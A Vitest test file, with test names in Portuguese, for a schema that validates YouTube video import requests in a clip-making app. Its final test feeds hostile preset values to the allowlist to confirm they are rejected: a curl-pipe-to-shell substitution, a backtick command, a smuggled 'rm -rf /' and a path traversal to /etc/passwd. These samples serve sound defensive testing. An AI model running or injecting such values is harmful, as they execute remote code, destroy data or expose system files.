import { describe, it, expect } from "vitest";
import { importYouTubeVideoSchema } from "~/domain/schemas/import-youtube-video.schema";
import { MAX_MANUAL_CUTS } from "~/domain/schemas/manual-cut.schema";
import { PROJECT_SUBTITLE_PRESETS } from "~/domain/schemas/projects-actions.schema";

const BASE = { url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" };

describe("importYouTubeVideoSchema", () => {
  it("aceita o payload mínimo válido (apenas url)", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    });

    expect(result.success).toBe(true);
  });

  it("aceita o payload completo válido", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      preset: "HORMOZI",
      mode: "manual",
      manualCuts: [{ id: "cut-1", title: "Corte 1", startTime: 10, endTime: 20 }],
      sliceStartTime: 0,
      sliceEndTime: 120,
      genre: "humor",
      clipModel: "gemini-flash",
      aspectRatio: "9:16",
      autoZoom: true,
      thumbnailUrl: "https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg",
    });

    expect(result.success).toBe(true);
  });

  it("rejeita quando url está vazia", () => {
    const result = importYouTubeVideoSchema.safeParse({ url: "" });
    expect(result.success).toBe(false);
  });

  it("rejeita quando url está ausente", () => {
    const result = importYouTubeVideoSchema.safeParse({});
    expect(result.success).toBe(false);
  });

  it("rejeita mode fora do enum auto|manual", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      mode: "sabotage",
    });

    expect(result.success).toBe(false);
  });

  it("rejeita manualCuts com endTime <= startTime (payload malicioso)", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      mode: "manual",
      manualCuts: [{ startTime: 50, endTime: 10 }],
    });

    expect(result.success).toBe(false);
  });

  it(`rejeita manualCuts com mais de ${MAX_MANUAL_CUTS} cortes (payload malicioso)`, () => {
    const manualCuts = Array.from({ length: MAX_MANUAL_CUTS + 1 }, (_, i) => ({
      startTime: i * 10,
      endTime: i * 10 + 5,
    }));

    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      mode: "manual",
      manualCuts,
    });

    expect(result.success).toBe(false);
  });

  it("rejeita sliceStartTime negativo", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      sliceStartTime: -10,
    });

    expect(result.success).toBe(false);
  });

  it("rejeita sliceEndTime negativo", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      sliceEndTime: -1,
    });

    expect(result.success).toBe(false);
  });

  it("rejeita autoZoom que não seja boolean", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      autoZoom: "yes" as unknown,
    });

    expect(result.success).toBe(false);
  });

  it("aceita url sem protocolo (validação de formato real fica a cargo do YouTubeUrl value object)", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "youtube.com/watch?v=dQw4w9WgXcQ",
    });

    expect(result.success).toBe(true);
  });

  it("não rejeita na borda uma url de outro domínio (delegado ao YouTubeUrl value object dentro do use case)", () => {
    const result = importYouTubeVideoSchema.safeParse({
      url: "https://vimeo.com/123456",
    });

    expect(result.success).toBe(true);
  });

  it.each(PROJECT_SUBTITLE_PRESETS)("aceita o preset %s oferecido pela UI", (preset) => {
    const result = importYouTubeVideoSchema.safeParse({ ...BASE, preset });
    expect(result.success).toBe(true);
  });

  it.each(["$(curl x.yz|sh)", "`id`", "HORMOZI; rm -rf /", "../../etc/passwd", "hormozi", "UNKNOWN"])(
    "rejeita preset fora da allowlist (payload malicioso: %s)",
    (preset) => {
      const result = importYouTubeVideoSchema.safeParse({ ...BASE, preset });
      expect(result.success).toBe(false);
    },
  );
});
